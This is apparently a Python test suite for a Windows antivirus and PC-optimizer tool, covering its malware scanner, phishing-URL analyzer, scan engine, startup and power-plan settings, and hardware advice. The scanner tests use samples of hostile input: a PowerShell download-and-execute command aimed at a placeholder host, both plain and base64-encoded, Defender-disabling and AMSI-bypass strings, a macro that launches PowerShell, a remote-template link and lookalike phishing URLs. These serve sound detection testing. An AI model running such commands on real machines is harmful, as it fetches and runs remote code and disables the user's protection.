import os
import shutil
import sys
import tempfile
import time
import unittest
from pathlib import Path

_HOME = tempfile.mkdtemp(prefix="sentinel_test_home_")
os.environ["XSECURE_HOME"] = _HOME  # must be set before importing the package
# every temp file/folder the tests create goes under _TMP, which is deleted when the module finishes, so test
# samples (fake malware scripts, double-extension files) are never left behind in the real Temp folder
# (a sibling of _HOME, not inside it: the temp cleaner deliberately never touches X-Secure's own data folder)
_TMP = tempfile.mkdtemp(prefix="sentinel_test_tmp_")
tempfile.tempdir = _TMP


def tearDownModule():
    tempfile.tempdir = None
    from sentinel import logger
    logger.close()
    shutil.rmtree(_TMP, ignore_errors=True)
    shutil.rmtree(_HOME, ignore_errors=True)



from sentinel import config, quarantine, webguard  # noqa: E402
from sentinel.scanner import CLEAN, ERROR, MALICIOUS, SUSPICIOUS, Scanner, SignatureDB, shannon_entropy  # noqa: E402

# Built at runtime so this source file is not itself flagged by real antivirus products.
EICAR = ("X5O!P%@AP[4\\PZX54(P^)7CC)7}$" + "EICAR-STANDARD-ANTIVIRUS-TEST-FILE!" + "$H+H*").encode()


class ScannerTests(unittest.TestCase):
    def setUp(self):
        self.dir = Path(tempfile.mkdtemp(prefix="sentinel_t_"))
        self.sc = Scanner()

    def tearDown(self):
        shutil.rmtree(self.dir, ignore_errors=True)

    def write(self, name, data):
        p = self.dir / name
        p.write_bytes(data if isinstance(data, bytes) else data.encode())
        return p

    def skip_if_av_blocked(self, r):
        # Windows Defender (or another AV) refuses to open EICAR files: errno 22 / file gone.
        if r.verdict == ERROR:
            self.skipTest("EICAR file blocked by the system antivirus: " + "; ".join(r.reasons))

    def test_eicar_is_malicious(self):
        r = self.sc.scan_file(self.write("eicar.com.txt", EICAR))
        self.skip_if_av_blocked(r)
        self.assertEqual(r.verdict, MALICIOUS)

    def test_hash_signature(self):
        p = self.write("bad.bin", "totally-fake-malware-sample")
        sha = self.sc.scan_file(p).sha256
        db = SignatureDB(dirs=[])
        db.hashes[sha] = "Unit-Test-Malware"
        r = Scanner(db).scan_file(p)
        self.assertEqual(r.verdict, MALICIOUS)

    def test_clean_text(self):
        self.assertEqual(self.sc.scan_file(self.write("notes.txt", "hello world")).verdict, CLEAN)

    def test_double_extension(self):
        r = self.sc.scan_file(self.write("invoice.pdf.exe", b"MZ" + b"\x00" * 100))
        self.assertIn(r.verdict, (SUSPICIOUS, MALICIOUS))

    def test_executable_disguised_as_pdf(self):
        r = self.sc.scan_file(self.write("report.pdf", b"MZ" + b"\x00" * 100))
        self.assertEqual(r.verdict, SUSPICIOUS)

    def test_powershell_downloader(self):
        s = "powershell -enc " + "QUJD" * 12 + "\nIEX (New-Object Net.WebClient).DownloadString('http://x.test/a')"
        r = self.sc.scan_file(self.write("run.ps1", s))
        self.assertIn(r.verdict, (SUSPICIOUS, MALICIOUS))

    def test_entropy(self):
        self.assertGreater(shannon_entropy(os.urandom(100000)), 7.5)
        self.assertLess(shannon_entropy(b"abababab" * 1000), 2)

    def test_scan_tree(self):
        self.write("a.txt", "ok")
        self.write("eicar.txt", EICAR)
        results = list(self.sc.scan_tree(self.dir))
        for r in results:
            self.skip_if_av_blocked(r)
        self.assertEqual(len(results), 2)
        self.assertEqual(sum(r.verdict == MALICIOUS for r in results), 1)


class AdvancedScannerTests(unittest.TestCase):
    def setUp(self):
        self.dir = Path(tempfile.mkdtemp(prefix="sentinel_adv_"))
        self.sc = Scanner()

    def tearDown(self):
        shutil.rmtree(self.dir, ignore_errors=True)

    def zip_of(self, name, members):
        import zipfile
        p = self.dir / name
        with zipfile.ZipFile(p, "w") as z:
            for n, data in members.items():
                z.writestr(n, data)
        return p

    def test_zip_with_executable(self):
        r = self.sc.scan_file(self.zip_of("a.zip", {"setup.exe": b"MZ\x00", "readme.txt": b"hi"}))
        self.assertTrue(any("programs/scripts" in x for x in r.reasons))

    def test_zip_with_disguised_program(self):
        r = self.sc.scan_file(self.zip_of("b.zip", {"invoice.pdf.exe": b"MZ"}))
        self.assertTrue(any("disguised" in x for x in r.reasons))

    def test_clean_zip(self):
        r = self.sc.scan_file(self.zip_of("c.zip", {"notes.txt": b"hello", "img.png": b"\x89PNG"}))
        self.assertEqual(r.verdict, CLEAN)

    def test_docx_hiding_macros_is_malicious(self):
        vba = b"Sub AutoOpen()\nShell \"powershell\"\nEnd Sub"
        r = self.sc.scan_file(self.zip_of("evil.docx", {"word/document.xml": b"<x/>", "word/vbaProject.bin": vba}))
        self.assertEqual(r.verdict, MALICIOUS)

    def test_plain_docx_is_clean(self):
        r = self.sc.scan_file(self.zip_of("ok.docx", {"word/document.xml": b"<x/>"}))
        self.assertEqual(r.verdict, CLEAN)

    def test_remote_template_injection(self):
        rels = b'<Relationship Type=".../attachedTemplate" Target="http://evil.test/t.dotm" TargetMode="External"/>'
        r = self.sc.scan_file(self.zip_of("t.docx", {"word/_rels/settings.xml.rels": rels}))
        self.assertTrue(any("remote template" in x for x in r.reasons))

    def test_legacy_ole_macro(self):
        data = b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 64 + b"VBA AutoOpen Shell" + b"\x00" * 64
        p = self.dir / "old.doc"
        p.write_bytes(data)
        self.assertEqual(self.sc.scan_file(p).verdict, SUSPICIOUS)

    def test_new_script_patterns(self):
        s = "Set-MpPreference -DisableRealtimeMonitoring $true\n[Ref].Assembly.GetType('AmsiUtils')"
        p = self.dir / "x.ps1"
        p.write_text(s)
        self.assertEqual(self.sc.scan_file(p).verdict, MALICIOUS)

    def test_ransom_note_name(self):
        p = self.dir / "HOW_TO_DECRYPT_FILES.txt"
        p.write_text("pay us")
        self.assertEqual(self.sc.scan_file(p).verdict, SUSPICIOUS)

    def test_allowlist(self):
        p = self.dir / "invoice.pdf.exe"
        p.write_bytes(b"MZ" + b"\x00" * 50)
        sha = self.sc.scan_file(p).sha256
        from sentinel.scanner import add_to_allowlist
        add_to_allowlist(sha, "unit test")
        r = Scanner().scan_file(p)
        self.assertEqual(r.verdict, CLEAN)
        # but a known-bad hash is never allowlisted away
        db = SignatureDB(dirs=[])
        db.hashes[sha] = "Bad"
        self.assertEqual(Scanner(db).scan_file(p).verdict, MALICIOUS)


class EvasionTests(unittest.TestCase):
    """Regression tests for the evasion gaps found in the security review."""
    PS = "Set-MpPreference -DisableRealtimeMonitoring $true\nIEX (New-Object Net.WebClient).DownloadString('http://x.test/a')"

    def setUp(self):
        self.dir = Path(tempfile.mkdtemp(prefix="sentinel_ev_"))
        self.sc = Scanner()

    def tearDown(self):
        shutil.rmtree(self.dir, ignore_errors=True)

    def scan_bytes(self, name, data):
        p = self.dir / name
        p.write_bytes(data)
        return self.sc.scan_file(p)

    def test_utf16_script_with_bom(self):
        r = self.scan_bytes("a.ps1", b"\xff\xfe" + self.PS.encode("utf-16-le"))
        self.assertEqual(r.verdict, MALICIOUS)

    def test_utf16_script_without_bom(self):
        r = self.scan_bytes("b.ps1", self.PS.encode("utf-16-le"))
        self.assertEqual(r.verdict, MALICIOUS)

    def test_short_encoded_flag_and_hidden_payload(self):
        import base64
        payload = base64.b64encode("IEX (New-Object Net.WebClient).DownloadString('http://x.test')".encode("utf-16-le"))
        r = self.scan_bytes("c.bat", b"powershell -w hidden -e " + payload)
        self.assertIn("PowerShell encoded command", r.reasons)
        self.assertTrue(any("hidden in encoded command" in x for x in r.reasons), r.reasons)
        self.assertEqual(r.verdict, MALICIOUS)

    def test_execution_policy_is_not_an_encoded_command(self):
        r = self.scan_bytes("d.ps1", b"powershell -ExecutionPolicy Bypass -File build.ps1")
        self.assertNotIn("PowerShell encoded command", r.reasons)

    def test_padded_executable_over_size_limit(self):
        p = self.dir / "setup.exe"
        with open(p, "wb") as f:
            f.write(b"MZ" + b"\x00" * 100)
            f.truncate(config.MAX_HEURISTIC_SIZE + (1 << 20))
        r = self.sc.scan_file(p)
        self.assertTrue(any("padded" in x for x in r.reasons), r.reasons)
        self.assertNotEqual(r.verdict, CLEAN)


URL_CASES = [
    "https://www.google.com/search?q=cats", "https://github.com/login", "http://paypa1-secure-login.xyz/verify",
    "https://paypal.com.account-check.top/", "http://192.168.1.1@evil.com/", "http://185.1.2.3/login",
    "http://xn--pypal-4ve.com/", "http://sentinel-test-bad.test/", "http://3232235777/login",
    "http://0xC0A80001/login", "http://0300.0250.0.1/", "http://192.168.1.1/",
    "http://pаypal-secure-login.xyz/verify", "https://evil.s3.amazonaws.com/paypal/login",
    "https://fonts.googleapis.com/css2?family=Inter", "https://storage.googleapis.com/google-fonts/a.woff2",
    "https://paypal-account.web.app/signin", "https://myproject.github.io/docs/",
]


class UrlEvasionTests(unittest.TestCase):
    def test_disguised_ips(self):
        for u in ("http://3232235777/login", "http://0xC0A80001/login", "http://0300.0250.0.1/"):
            v = webguard.analyze_url(u)
            self.assertTrue(any("disguised" in r for r in v.reasons), (u, v.reasons))
        self.assertFalse(any("disguised" in r for r in webguard.analyze_url("http://192.168.1.1/").reasons))

    def test_parse_ipv4(self):
        self.assertEqual(webguard.parse_ipv4("3232235777"), "192.168.1.1")
        self.assertEqual(webguard.parse_ipv4("0xc0a80001"), "192.168.0.1")
        self.assertEqual(webguard.parse_ipv4("1.2.3"), "1.2.0.3")
        self.assertIsNone(webguard.parse_ipv4("example.com"))
        self.assertIsNone(webguard.parse_ipv4("256.1.1.1"))

    def test_unicode_lookalike_becomes_punycode(self):
        v = webguard.analyze_url("http://pаypal-secure-login.xyz/verify")
        self.assertTrue(any("Punycode" in r for r in v.reasons), v.reasons)

    def test_user_content_hosting(self):
        self.assertNotEqual(webguard.analyze_url("https://evil.s3.amazonaws.com/paypal/login").verdict, "clean")
        self.assertNotEqual(webguard.analyze_url("https://paypal-account.web.app/signin").verdict, "clean")
        self.assertEqual(webguard.analyze_url("https://fonts.googleapis.com/css2?family=Inter").verdict, "clean")
        self.assertEqual(webguard.analyze_url("https://storage.googleapis.com/google-fonts/a.woff2").verdict, "clean")

    def test_python_and_browser_extension_agree(self):
        import json
        import subprocess
        node = shutil.which("node")
        if not node:
            self.skipTest("node not installed")
        js = Path(__file__).resolve().parent.parent / "browser_extension" / "analyzer.js"
        harness = self_dir = Path(tempfile.mkdtemp()) / "h.js"
        harness.write_text(
            "const fs=require('fs');eval(fs.readFileSync(process.argv[2],'utf8'));"
            "const urls=JSON.parse(fs.readFileSync(process.argv[3],'utf8'));"
            "console.log(JSON.stringify(urls.map(u=>analyzeUrl(u,['sentinel-test-bad.test']))));", encoding="utf-8")
        data = harness.with_name("urls.json")
        data.write_text(json.dumps(URL_CASES), encoding="utf-8")
        out = subprocess.run([node, str(harness), str(js), str(data)], capture_output=True, text=True,
                             encoding="utf-8", timeout=30)
        self.assertEqual(out.returncode, 0, out.stderr)
        for url, jv in zip(URL_CASES, json.loads(out.stdout)):
            pv = webguard.analyze_url(url)
            self.assertEqual((pv.verdict, pv.score, pv.reasons), (jv["verdict"], jv["score"], jv["reasons"]), url)
        shutil.rmtree(self_dir.parent, ignore_errors=True)


class EngineTests(unittest.TestCase):
    def setUp(self):
        from sentinel import engine
        self.engine = engine
        self.dir = Path(tempfile.mkdtemp(prefix="sentinel_eng_"))
        (self.dir / "sub").mkdir()
        (self.dir / "skipme").mkdir()
        files = {"a.txt": b"hello", "sub/b.txt": b"world", "sub/invoice.pdf.exe": b"MZ" + b"\0" * 64,
                 "sub/run.ps1": b"IEX (New-Object Net.WebClient).DownloadString('x'); powershell -enc " + b"QUJD" * 8,
                 "skipme/c.txt": b"excluded"}
        for name, data in files.items():
            (self.dir / name).write_bytes(data)
        self.cache = self.dir.parent / (self.dir.name + "_cache.sqlite")

    def tearDown(self):
        shutil.rmtree(self.dir, ignore_errors=True)
        for suffix in ("", "-wal", "-shm"):
            Path(str(self.cache) + suffix).unlink(missing_ok=True)

    def verdicts(self, results):
        return {os.path.normcase(r.path): (r.verdict, r.score) for r in results}

    def test_iter_files_excludes_and_dedupes_overlapping_roots(self):
        got = [p for p, _, _ in self.engine.iter_files([self.dir / "sub", self.dir], exclude=[self.dir / "skipme"])]
        names = sorted(os.path.relpath(p, self.dir) for p in got)
        self.assertEqual(names, sorted(["a.txt", os.path.join("sub", "b.txt"), os.path.join("sub", "invoice.pdf.exe"),
                                        os.path.join("sub", "run.ps1")]))

    def test_iter_files_does_not_follow_junctions(self):
        import subprocess
        if sys.platform != "win32":
            self.skipTest("junctions are Windows-only")
        link = self.dir / "loop"
        r = subprocess.run(["cmd", "/c", "mklink", "/J", str(link), str(self.dir)], capture_output=True)
        if r.returncode != 0:
            self.skipTest("could not create a junction here")
        got = list(self.engine.iter_files([self.dir]))
        self.assertEqual(len(got), 5)  # each real file once; no infinite loop through the junction

    def test_cache_skips_unchanged_and_rescans_changed(self):
        eng = self.engine.ScanEngine(workers=1, cache_path=self.cache)
        first = self.verdicts(eng.scan([self.dir]))
        self.assertEqual(eng.stats.cached, 0)
        self.assertEqual(eng.stats.threats, 2)
        second = self.verdicts(eng.scan([self.dir]))
        self.assertEqual(eng.stats.cached, 5)
        self.assertEqual(first, second)  # cached answers are identical, including threats
        (self.dir / "a.txt").write_bytes(b"changed content, different size")
        list(eng.scan([self.dir]))
        self.assertEqual(eng.stats.cached, 4)

    def test_signature_change_invalidates_cache(self):
        eng = self.engine.ScanEngine(workers=1, cache_path=self.cache)
        list(eng.scan([self.dir]))
        from sentinel.scanner import add_to_allowlist
        add_to_allowlist("0" * 64, "fingerprint change")
        list(eng.scan([self.dir]))
        self.assertEqual(eng.stats.cached, 0)

    def test_parallel_matches_serial(self):
        serial = self.engine.ScanEngine(workers=1, use_cache=False)
        parallel = self.engine.ScanEngine(workers=2, use_cache=False, low_priority=False)
        a = self.verdicts(serial.scan([self.dir]))
        b = self.verdicts(parallel.scan([self.dir]))
        self.assertEqual(len(a), 5)
        self.assertEqual(a, b)
        self.assertEqual(parallel.stats.threats, 2)

    def test_cancel_stops_scan(self):
        import threading
        ev = threading.Event()
        ev.set()
        eng = self.engine.ScanEngine(workers=2, use_cache=False)
        self.assertEqual(list(eng.scan([self.dir], cancel=ev)), [])

    def test_scan_plans(self):
        roots, exclude = self.engine.full_scan_plan()
        norm = [os.path.normcase(os.path.abspath(r)) for r in roots]
        self.assertEqual(len(norm), len(set(norm)))
        self.assertTrue(roots)
        self.assertIn(os.path.normcase(str(config.DATA_DIR)), [os.path.normcase(e) for e in exclude])
        drives = self.engine.fixed_drives()
        self.assertEqual(roots[-len(drives):], drives)  # high-risk folders come before whole drives
        q_roots, _ = self.engine.quick_scan_plan()
        self.assertEqual(q_roots, roots[:len(q_roots)])


@unittest.skipUnless(sys.platform == "win32", "optimizer registry tests are Windows-only")
class OptimizerTests(unittest.TestCase):
    """All registry work happens under a scratch HKCU key, never the real StartupApproved or Run keys."""
    BASE = r"Software\XSecureTest\Approved"

    def setUp(self):
        from sentinel import optimizer
        self.opt = optimizer
        self.hist = optimizer.History(Path(tempfile.mkdtemp()) / "hist.json")

    def tearDown(self):
        import winreg

        def wipe(path):
            try:
                with winreg.OpenKey(winreg.HKEY_CURRENT_USER, path, 0,
                                    winreg.KEY_READ | winreg.KEY_WRITE) as k:
                    while True:
                        try:
                            wipe(path + "\\" + winreg.EnumKey(k, 0))
                        except OSError:
                            break
                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, path)
            except OSError:
                pass
        wipe(r"Software\XSecureTest")

    def item(self, name="Spotify", protected=False, manageable=True, source="hkcu_run"):
        return self.opt.StartupItem(name=name, command=r'"C:\x\a.exe"', source=source, enabled=True,
                                    protected=protected, manageable=manageable)

    def test_disable_verify_and_exact_restore(self):
        o = self.opt
        r = o.apply_startup_disable(self.item(), self.hist, self.BASE)
        self.assertTrue(r.ok, r.message)
        self.assertFalse(o.get_startup_state("hkcu_run", "Spotify", self.BASE)[0])
        (entry,) = self.hist.pending()
        self.assertIsNone(entry["original"]["raw"])            # there was no value before
        self.assertTrue(o.undo_entry(entry, self.hist).ok)
        self.assertEqual(o.get_startup_state("hkcu_run", "Spotify", self.BASE), (True, None))  # value removed again
        self.assertEqual(self.hist.pending(), [])

    def test_restore_keeps_preexisting_value_byte_for_byte(self):
        o = self.opt
        original = b"\x02" + b"\x00" * 11
        o._write_startup_raw("hkcu_run", "Zoom", original, self.BASE)
        o.apply_startup_disable(self.item("Zoom"), self.hist, self.BASE)
        self.assertFalse(o.get_startup_state("hkcu_run", "Zoom", self.BASE)[0])
        o.undo_all(self.hist)
        self.assertEqual(o.get_startup_state("hkcu_run", "Zoom", self.BASE), (True, original))

    def test_protected_and_machine_wide_items_are_refused(self):
        o = self.opt
        self.assertFalse(o.apply_startup_disable(self.item("SecurityHealth", protected=True), self.hist,
                                                 self.BASE).ok)
        self.assertFalse(o.apply_startup_disable(self.item(manageable=False, source="hklm_run"), self.hist,
                                                 self.BASE).ok)
        self.assertEqual(self.hist.all(), [])                    # nothing recorded, nothing changed
        self.assertEqual(o.set_startup_enabled("hklm_run", "x", False, self.BASE).ok, False)

    def test_protection_rules(self):
        o = self.opt
        for name, cmd in (("SecurityHealth", "C:\\Windows\\System32\\SecurityHealthSystray.exe"),
                          ("Realtek HD Audio Manager", "C:\\x\\RtkNGUI64.exe"),
                          ("Windows Defender", ""), ("NVIDIA Display Driver", "x"),
                          ("X-Secure", "py main.py")):
            self.assertTrue(o.is_protected_startup(name, cmd), name)
        for name in ("Spotify", "Discord", "Steam", "Zoom"):
            self.assertFalse(o.is_protected_startup(name, r"C:\Users\u\AppData\Local\app.exe"), name)

    def test_parse_power_plans_any_language(self):
        text = ("Existing Power Schemes (* Active)\n-----------------------------------\n"
                "Power Scheme GUID: 381b4222-f694-41f0-9685-ff5bb260df2e  (Balanced) *\n"
                "Power Scheme GUID: a1841308-3541-4fab-bc81-f71556f20b4a  (Power saver)\n"
                "GUID du mode d'alimentation : 8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c  (Performances elevees)\n")
        plans = self.opt.parse_power_plans(text)
        self.assertEqual([(g[:8], a) for g, _, a in plans], [("381b4222", True), ("a1841308", False),
                                                            ("8c5e7fda", False)])
        ok, why = self.opt.profile_support("gaming", plans)
        self.assertTrue(ok)
        ok, why = self.opt.profile_support("gaming", plans[:2])  # High performance hidden by Windows
        self.assertFalse(ok)
        self.assertIn("hidden", why)

    def test_hidden_builtin_plans_still_count_as_available(self):
        """Regression: on many PCs `powercfg /list` hides High performance / Power saver unless active. They still
        exist, so switching to them (and restoring them) must work."""
        o = self.opt
        listed = [(o.PLAN_BALANCED, "Balanced", True)]
        queried = []

        def fake_powercfg(*a):
            if a and a[0] == "/query":
                queried.append(a[1])
                return f"Power Scheme GUID: {a[1]}  (x)" if a[1] in (o.PLAN_HIGH, o.PLAN_SAVER) else "does not exist"
            return ""
        real = (o.list_power_plans, o._powercfg)
        o.list_power_plans, o._powercfg = (lambda: list(listed)), fake_powercfg
        o._exists_cache.clear()
        try:
            self.assertTrue(o.plan_exists(o.PLAN_HIGH))
            self.assertTrue(o.profile_support("gaming")[0])
            self.assertTrue(o.profile_support("eco")[0])
            self.assertFalse(o.plan_exists("00000000-1111-2222-3333-444444444444"))
            guids = {g for g, _, _ in o.available_plans()}
            self.assertEqual(guids, {o.PLAN_BALANCED, o.PLAN_HIGH, o.PLAN_SAVER})
            o.plan_exists(o.PLAN_HIGH)
            self.assertEqual(queried.count(o.PLAN_HIGH), 1)        # existence is cached, not re-queried
        finally:
            o.list_power_plans, o._powercfg = real
            o._exists_cache.clear()

    def test_power_switch_rolls_back_when_verification_fails(self):
        o = self.opt
        calls = []
        plans = [(o.PLAN_BALANCED, "Balanced", True), (o.PLAN_HIGH, "High", False)]
        o.list_power_plans, o.active_plan, o._powercfg = (
            lambda: plans, lambda: (o.PLAN_BALANCED, "Balanced"), lambda *a: calls.append(a) or "")
        try:
            r = o.set_active_plan(o.PLAN_HIGH)   # Windows "ignores" setactive: active plan never changes
        finally:
            import importlib
            importlib.reload(o)
        self.assertFalse(r.ok)
        self.assertEqual(calls, [("/setactive", o.PLAN_HIGH), ("/setactive", o.PLAN_BALANCED)])

    def test_temp_cleanup_only_touches_old_files_inside_root(self):
        o = self.opt
        root = Path(tempfile.mkdtemp(prefix="xs_tmp_"))
        outside = Path(tempfile.mkdtemp(prefix="xs_keep_"))
        old, new = root / "old.tmp", root / "new.tmp"
        (root / "sub").mkdir()
        deep = root / "sub" / "deep.tmp"
        for f in (old, new, deep):
            f.write_bytes(b"x" * 1000)
        keep = outside / "important.docx"
        keep.write_bytes(b"do not delete")
        past = time.time() - 10 * 86400
        for f in (old, deep, keep):
            os.utime(f, (past, past))
        self.assertEqual(o.estimate_temp([root]), (2, 2000))
        deleted, freed, skipped = o.clean_temp([root])
        self.assertEqual((deleted, freed, skipped), (2, 2000, 0))
        self.assertFalse(old.exists() or deep.exists())
        self.assertTrue(new.exists() and keep.exists())          # recent file and files outside the root survive
        shutil.rmtree(root, ignore_errors=True)
        shutil.rmtree(outside, ignore_errors=True)

    def test_compare_is_honest_about_small_changes(self):
        o = self.opt
        a = o.Snapshot(cpu=10, ram_total=16 << 30, ram_used=8 << 30)
        b = o.Snapshot(cpu=12, ram_total=16 << 30, ram_used=int(7.8 * (1 << 30)))
        self.assertIn("No meaningful change", o.compare(a, b))
        c = o.Snapshot(cpu=10, ram_total=16 << 30, ram_used=6 << 30)
        self.assertIn("Measured change", o.compare(a, c))

    def test_history_persists_and_marks_restored(self):
        eid = self.hist.add("startup", "t", {}, {}, {})
        self.assertEqual(len(self.opt.History(self.hist.path).pending()), 1)
        self.hist.mark_restored(eid)
        self.assertEqual(self.hist.pending(), [])
        self.assertEqual(len(self.hist.all()), 1)                # kept for the audit trail


class HardwareAndScanTests(unittest.TestCase):
    """Hardware cache, hardware-specific recommendations, scan modes, and the analytics honesty rules."""

    def setUp(self):
        from sentinel import analytics, hardware, optimizer
        self.hw, self.an, self.opt = hardware, analytics, optimizer
        for f in ("hardware_profile.json", "analytics.json", "optimizer_state.json"):
            try:
                (config.DATA_DIR / f).unlink()
            except OSError:
                pass

    PS = {"cpu": {"Name": "Test CPU", "Manufacturer": "X", "NumberOfCores": 4, "NumberOfLogicalProcessors": 8,
                  "MaxClockSpeed": 3000},
          "gpu": [{"Name": "NVIDIA GeForce RTX 9999", "AdapterRAM": 4294967295, "CurrentRefreshRate": 144},
                  {"Name": "AMD Radeon(TM) Graphics", "AdapterRAM": 536870912, "CurrentRefreshRate": 60}],
          "disks": [{"FriendlyName": "Fast", "MediaType": "Unspecified", "BusType": 17, "Size": 512 * 2 ** 30,
                     "HealthStatus": "Healthy", "OperationalStatus": "OK"}],
          "chassis": [10], "mem": [{"Capacity": 8 * 2 ** 30, "Speed": 3200, "ConfiguredClockSpeed": 3200}]}

    def test_profile_is_cached_and_refreshed_only_on_change(self):
        calls = []
        q = lambda: calls.append(1) or self.PS
        p1 = self.hw.get_profile(query=q)
        p2 = self.hw.get_profile(query=q)
        self.assertEqual(len(calls), 1)
        self.assertFalse(p1["from_cache"])
        self.assertTrue(p2["from_cache"])
        real = self.hw.quick_fingerprint
        self.hw.quick_fingerprint = lambda: {**real(), "ram": 1}      # pretend the RAM changed
        try:
            p3 = self.hw.get_profile(query=q)
        finally:
            self.hw.quick_fingerprint = real
        self.assertEqual(len(calls), 2)
        self.assertTrue(p3["changed"])

    def test_profile_parsing_never_guesses(self):
        p = self.hw.build_profile(self.PS, {"ram": 8 * 2 ** 30})
        self.assertEqual(p["form_factor"], "laptop")
        self.assertEqual(p["disks"][0]["type"], "SSD")                  # NVMe bus -> SSD
        self.assertEqual(p["cpu"]["threads"], 8)
        empty = self.hw.build_profile({}, {"ram": None})
        self.assertIsNone(empty["form_factor"])
        self.assertIsNone(empty["cpu"]["name"])
        self.assertEqual(empty["disks"], [])
        weird = dict(self.PS, disks=[{"FriendlyName": "x", "MediaType": "Unspecified", "BusType": 1}])
        self.assertIsNone(self.hw.build_profile(weird, {})["disks"][0]["type"])   # unknown stays unknown

    def _recs(self, hw, **kw):
        snap = self.opt.Snapshot(cpu=kw.get("cpu", 10), ram_total=16 * 2 ** 30, ram_used=4 * 2 ** 30,
                                 ram_pct=kw.get("ram", 25), disk_pct=kw.get("disk", 40), power_plan="High performance")
        live = {"on_ac": kw.get("on_ac", True), "battery_pct": kw.get("bat", 80)}
        plans = [(self.opt.PLAN_BALANCED, "Balanced", False), (self.opt.PLAN_HIGH, "High", True),
                 (self.opt.PLAN_SAVER, "Saver", False)]
        return {r.key: r for r in self.opt.hardware_recommendations(hw, snap, live, kw.get("active"), plans)}

    def test_recommendations_depend_on_the_detected_hardware(self):
        hybrid = self.hw.build_profile(self.PS, {"ram": 16 * 2 ** 30})
        keys = self._recs(hybrid)
        self.assertIn("hw:hybrid-gpu", keys)
        self.assertNotIn("hw:igpu-only", keys)
        self.assertNotIn("hw:hdd", keys)                                 # SSD: no HDD advice
        self.assertEqual(self._recs({}), {})                             # nothing known -> nothing suggested
        igpu = self.hw.build_profile(dict(self.PS, gpu=[self.PS["gpu"][1]]), {"ram": 16 * 2 ** 30})
        keys = self._recs(igpu)
        self.assertIn("hw:igpu-only", keys)
        self.assertNotIn("hw:hybrid-gpu", keys)
        hdd = self.hw.build_profile(dict(self.PS, disks=[dict(self.PS["disks"][0], MediaType="HDD", BusType=11)]),
                                    {"ram": 16 * 2 ** 30})
        self.assertIn("hw:hdd", self._recs(hdd))

    def test_battery_and_form_factor_rules(self):
        laptop = self.hw.build_profile(self.PS, {"ram": 16 * 2 ** 30})
        desktop = self.hw.build_profile(dict(self.PS, chassis=[3]), {"ram": 16 * 2 ** 30})
        r = self._recs(laptop, on_ac=False, active="gaming")
        self.assertIn("hw:battery-gaming", r)
        self.assertTrue(r["hw:battery-gaming"].actionable)
        self.assertEqual(r["hw:battery-gaming"].target, {"profile": "balanced"})
        self.assertIn("hw:thermal", r)
        self.assertNotIn("hw:battery-gaming", self._recs(laptop, on_ac=True, active="gaming"))   # plugged in: fine
        self.assertNotIn("hw:thermal", self._recs(desktop, active="gaming"))
        self.assertIn("hw:desktop-saver", self._recs(desktop, active="eco"))
        self.assertNotIn("hw:desktop-saver", self._recs(laptop, active="eco"))
        # Eco is not offered if Windows hides the power-saver plan
        gone = self.opt.hardware_recommendations(laptop, self.opt.Snapshot(power_plan="x"), {"on_ac": False,
                                                 "battery_pct": 10}, "balanced", [(self.opt.PLAN_BALANCED, "B", True)])
        self.assertFalse(any(r.key == "hw:battery-low" for r in gone))

    def test_every_recommendation_carries_the_required_fields(self):
        laptop = self.hw.build_profile(dict(self.PS, mem=[self.PS["mem"][0]]), {"ram": 8 * 2 ** 30})
        for r in self._recs(laptop, on_ac=False, active="gaming", ram=90, disk=92, cpu=85).values():
            self.assertIn(r.category, self.opt.CATEGORIES)
            for f in ("title", "issue", "why", "benefit", "risk", "component", "side_effects"):
                self.assertTrue(getattr(r, f), (r.key, f))

    def test_scan_modes_report_progress_and_never_change_anything(self):
        events = []
        a = self.opt.scan("quick", progress=lambda e, n, p: events.append((e, n)))
        self.assertFalse(a.cancelled)
        self.assertIn(("done", "Memory and CPU"), events)
        self.assertNotIn("Hardware details", a.completed)               # quick doesn't do the heavy parts
        self.assertTrue(all(r.category in self.opt.CATEGORIES for r in a.recommendations))
        self.assertNotIn("Old temp files", a.completed)

    def test_scan_can_be_cancelled_and_duplicates_are_refused(self):
        import threading
        ev = threading.Event()
        threading.Timer(0.6, ev.set).start()
        a = self.opt.scan("deep", cancel=ev)
        self.assertTrue(a.cancelled)
        self.assertLess(len(a.completed), 8)
        self.opt._scan_lock.acquire()
        try:
            with self.assertRaises(self.opt.ScanBusy):
                self.opt.scan("quick")
        finally:
            self.opt._scan_lock.release()

    def test_profile_switch_keeps_the_original_plan_and_verifies(self):
        opt = self.opt
        plan = {"g": (opt.PLAN_BALANCED, "Balanced")}
        real = (opt.active_plan, opt.set_active_plan, opt.list_power_plans)
        opt.active_plan = lambda: plan["g"]
        opt.list_power_plans = lambda: [(opt.PLAN_BALANCED, "Balanced", False), (opt.PLAN_HIGH, "High", False)]

        def setter(guid):
            plan["g"] = (guid, "x")
            return opt.ApplyResult(True, "ok")
        opt.set_active_plan = setter
        hist = opt.History(Path(tempfile.mkdtemp()) / "h.json")
        try:
            self.assertTrue(opt.apply_profile("gaming", hist).ok)
            self.assertEqual(opt.get_state()["original_plan"]["guid"], opt.PLAN_BALANCED)
            n = len(hist.pending())
            self.assertTrue(opt.apply_profile("gaming", hist).ok)       # already active: no duplicate change
            self.assertEqual(len(hist.pending()), n)
            opt.apply_profile("balanced", hist)
            self.assertEqual(opt.get_state()["original_plan"]["guid"], opt.PLAN_BALANCED)   # not overwritten
            opt.set_active_plan = lambda guid: opt.ApplyResult(False, "Windows did not accept the change.")
            before = len(hist.pending())
            self.assertFalse(opt.apply_profile("gaming", hist).ok)      # failure: nothing recorded as applied
            self.assertEqual(len(hist.pending()), before)
        finally:
            opt.active_plan, opt.set_active_plan, opt.list_power_plans = real

    def test_analytics_only_reports_real_data(self):
        an = self.an
        self.assertIsNone(an.stats([]))
        self.assertIsNone(an.stats([None, None]))
        s = an.stats([2, 4, 6])
        self.assertEqual((s["mean"], s["n"], s["min"], s["max"]), (4, 3, 2, 6))
        self.assertAlmostEqual(s["std"], 2.0)
        for k in ("power", "fps", "frametime"):                          # can't be measured here -> never invented
            self.assertIn(k, an.UNAVAILABLE)
        self.assertIsNone(an.external_benchmarks("Any CPU"))             # no bundled benchmark numbers
        self.assertFalse(an.has_consent())                               # off by default
        an.set_consent(True)
        self.assertTrue(an.has_consent())
        sess = an.measure("gaming", "gaming", 2, None, None)
        self.assertEqual(len(sess["series"]["cpu"]), 2)
        self.assertEqual(sess["metrics"]["fps"], None)
        self.assertEqual(sess["metrics"]["power"], None)
